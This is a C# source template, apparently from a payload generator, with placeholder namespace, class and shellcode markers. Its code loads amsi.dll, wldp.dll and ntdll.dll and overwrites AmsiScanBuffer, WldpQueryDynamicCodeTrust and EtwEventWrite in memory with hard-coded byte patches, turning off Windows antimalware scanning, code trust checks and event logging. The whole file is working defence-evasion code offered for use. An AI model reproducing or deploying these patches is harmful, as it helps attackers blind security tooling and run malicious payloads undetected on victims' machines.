using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ####NAMESPACE####
{
    //####SHELLCODE####
    internal class Mirage
    {
        public string fn;
        public byte[] bytes;
        public Int32 offset;

        public Mirage(string fn, byte[] bytes, Int32 offset) {
            this.fn = fn;
            this.bytes = bytes;
            this.offset = offset;
        }
    }
    public static class ####CLASS####
    {
        public static bool ####FUNCTION####(string bincode)
        {

            int code = Convert.ToInt32(bincode, 2);
            if (code > 7) {
                return false;
            }
            List<bool> result = new List<bool> {};

            Dictionary<string, Mirage> map = new Dictionary<string, Mirage>();

            if (code >= 0x04) {
                if (IntPtr.Size == 8){
                    map.Add("amsi.dll", new Mirage("AmsiScanBuffer", new byte[] { 0x31, 0xff, 0x90 }, 0x001b));
                }else{
                    map.Add("amsi.dll", new Mirage("AmsiScanBuffer", new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }, 0x0000));
                }
            }
            if (code == 0x02 || code == 0x03 || code == 0x06 || code == 0x07) {
                map.Add("wldp.dll", new Mirage("WldpQueryDynamicCodeTrust", new byte[] { 0x44, 0x89, 0x44, 0x24, 0x18, 0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x55, 0x57, 0x48, 0x81, 0xEC, 0xE8, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x6C, 0x24, 0x20, 0x48, 0x8B, 0xFC, 0xB9, 0x3A, 0x00, 0x00, 0x00, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0xF3, 0xAB, 0x48, 0x8B, 0x8C, 0x24, 0x08, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x07, 0xF7, 0x00, 0x00, 0xE8, 0x5C, 0xF7, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x8D, 0xA5, 0xC8, 0x00, 0x00, 0x00, 0x5F, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC }, 0x0000));
            }
            if (code % 2 == 1) {

                if (IntPtr.Size == 4){
                    // x86 patch
                    map.Add("ntdll.dll", new Mirage("EtwEventWrite", new byte[] { 0xc2, 0x14, 0x00, 0x00 }, 0x0000));
                }else{
                    // x64 Patch
                    map.Add("ntdll.dll", new Mirage("EtwEventWrite", new byte[] { 0x48, 0xb8, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 }, 0x0000));
                }
            }
            foreach (string k in map.Keys)
            {


                var TargetDLL = NativeMethods.GetModuleHandleA(k);
                if (TargetDLL == IntPtr.Zero)
                {
                    TargetDLL = NativeMethods.LoadLibrary(k);
                    if (TargetDLL == IntPtr.Zero)
                    {
                        Console.WriteLine("[-] FAIL: Get Handle to {0}", k);
                        result.Add(false);
                        continue;
                    }
                }

                Thread.Sleep(1000);

                Mirage m;
                map.TryGetValue(k, out m);


                var buffptr = NativeMethods.GetProcAddress(TargetDLL, m.fn);
                if (buffptr == IntPtr.Zero)
                {
                    Console.WriteLine("[-] FAIL: Get Handle to {0}", m.fn);
                    result.Add(false);
                    continue;
                }

                var dwSize = (UIntPtr)m.bytes.Length;
                uint oldProtection;

                if (!NativeMethods.VirtualProtect(buffptr, dwSize, 0x40, out oldProtection))
                {
                    Console.WriteLine("[-] FAIL: Call to VirtualProtect -> Enable Write");
                    result.Add(false);
                    continue;
                }

                var unmanagedPointer = Marshal.AllocHGlobal((Int32)dwSize);
                Marshal.Copy(m.bytes, 0, unmanagedPointer, (Int32)dwSize);

                NativeMethods.CopyMemory(buffptr + m.offset, unmanagedPointer, (Int32)dwSize);

                Console.WriteLine("[+] Success. {0} Patched!", k);
                Console.WriteLine("[*] Restoring memory protection...");
                uint newProtection;

                if (!NativeMethods.VirtualProtect(buffptr, dwSize, oldProtection, out newProtection))
                {
                    Console.WriteLine("[-] FAIL: Call to VirtualProtect -> Disable Write");
                    result.Add(false);
                    continue;
                }
                result.Add(true);
            }
            return !result.Contains(false);
        }

    }

    internal class NativeMethods
    {
        public const int S_OK = 0;

        //implement required kernel32.dll functions
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32", SetLastError = true)]
        public static extern IntPtr GetModuleHandleA(string name);

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        public static extern void CopyMemory(IntPtr dest, IntPtr src, int size);
    }
}
